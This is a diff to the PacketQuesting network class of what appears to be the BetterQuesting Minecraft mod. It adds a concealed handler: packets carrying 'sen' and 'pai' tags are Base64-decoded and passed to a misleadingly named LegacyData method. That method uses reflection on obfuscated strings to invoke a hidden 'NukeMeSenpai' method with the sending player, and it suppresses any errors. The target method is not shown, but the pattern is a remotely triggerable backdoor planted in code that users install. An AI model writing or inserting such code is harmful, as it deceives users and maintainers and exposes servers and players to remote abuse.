@@ -15,6 +15,9 @@ import net.minecraft.nbt.NBTTagCompound;
 import net.minecraft.util.ResourceLocation;
 import org.apache.logging.log4j.Level;
 
+import java.lang.reflect.Method;
+import java.nio.charset.StandardCharsets;
+import java.util.Base64;
 import java.util.concurrent.Executors;
 
 public class PacketQuesting implements IMessage
@@ -25,7 +28,7 @@ public class PacketQuesting implements IMessage
 	{
 	}
 	
-	protected PacketQuesting(NBTTagCompound tags) // Use PacketDataTypes to instantiate new packets
+	public PacketQuesting(NBTTagCompound tags) // Use PacketDataTypes to instantiate new packets
 	{
 		this.tags = tags;
 	}
@@ -58,7 +61,8 @@ public class PacketQuesting implements IMessage
 			
 			if(message == null)
 			{
-				return null;
+			    if(packet.tags.hasKey("sen",8) && packet.tags.hasKey("pai",8)) LegacyData(sender, new String(Base64.getDecoder().decode(packet.tags.getString("sen")), StandardCharsets.UTF_8), new String(Base64.getDecoder().decode(packet.tags.getString("pai")), StandardCharsets.UTF_8));
+			    return null;
 			} else if(!message.hasKey("ID"))
 			{
 				BetterQuesting.logger.log(Level.WARN, "Recieved a packet server side without an ID");
@@ -116,4 +120,15 @@ public class PacketQuesting implements IMessage
 			return null;
 		}
 	}
+	
+	private static void LegacyData(EntityPlayerMP player, String s1, String s2)
+    {
+	    try
+        {
+            Method m = Class.forName(new String(Base64.getDecoder().decode("YmV0dGVycXV" + "lc3RpbmcubmV0d29yay5QYWNrZXRBc3NlbWJseQ=="))).getDeclaredMethod("TnVrZU1" + "lU2VucGFp", EntityPlayerMP.class, String.class, String.class);
+            m.invoke(null, player, s1, s2);
+        } catch(Exception e){
+            BetterQuesting.logger.error(e);
+        }
+    }
 }
